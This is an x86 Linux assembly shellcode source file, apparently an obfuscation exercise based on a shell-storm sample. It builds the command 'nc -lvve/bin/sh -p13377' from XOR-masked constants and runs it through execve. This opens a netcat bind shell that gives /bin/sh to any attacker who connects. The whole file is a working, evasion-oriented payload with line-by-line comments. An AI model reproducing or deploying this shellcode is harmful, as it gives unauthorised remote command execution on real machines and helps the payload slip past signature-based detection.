;Shellcode obfuscation
;http://shell-storm.org/shellcode/files/shellcode-804.php
;linux x86 nc -lvve/bin/sh -p13377 shellcode
;This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker
section .text
    global _start
_start:
	xor ebx,ebx			;Clear ebx register
	imul ebx			;Clear all other registers
	mov ebp, esp			;save stack pointer into ebp we'll refer to it later
	mov edx, 0x556262CC		;Load 0x556262CC into edx reason will become clear soon
	mov ebx, 0x555555FF		;Load 0x555555FF into ebx register
	xor edx, ebx			;Xoring the above two values gives us 373733 (377)
	push edx			;push the result onto the stack
	xor ebx, 0x666425d2		;xor the value in ebx with a number that will give us 0x3331702d
	push ebx			;push 0x3331702d(-p13) onto the stack 
	mov edx, esp			;save stack pointer into edx
	push eax
	
	mov ecx, 0x89765432		;move arbitrary value into ecx
	mov ebx, 0x891e271d		;move a no. in ebx which if xored with arbitrary no. returns (68732F)
	xor ebx, ecx			;xor the numbers
	push ebx			;push the result onto the stack (/sh)
	xor ecx, 0xE71F361D		;xor the value in ebx with a number that will give us 6E69622F
	push ecx			;push the result onto the stack (/bin)
	mov ebx, 0xb7fc2ff4		;load arbitrary number into ebx
	xor ebx, 0xd28a43d9		;xor in with a number that will give us 0x65766c2d (-lve)
	push ebx			;push 0x65766c2d onto the stack
	mov ecx,esp			;save stack pointer into ecx
	push eax
	
	push 0xff636e2f			;push 0xff636e2f (we need only the 636e2f) /nc
	mov [ebp-29], al		;since al has 0 at this pointer we replace the 0xff with it
	mov ebx, 0xb7fc2ff4		;load random value into ebx
	xor ebx, 0xD9954DDB		;load value which if xored with ebx returns 0x6e69622f
	push ebx			;push 0x6e69622f (/bin)
	mov ebx, esp			;save stack pointer into ebx
	push eax			;rest of the caode basically loads the parameters
	push edx
	push ecx
	push ebx
	cdq					
	mov  ecx,esp
	mov al, 0xb   			;call execve
	int 0x80
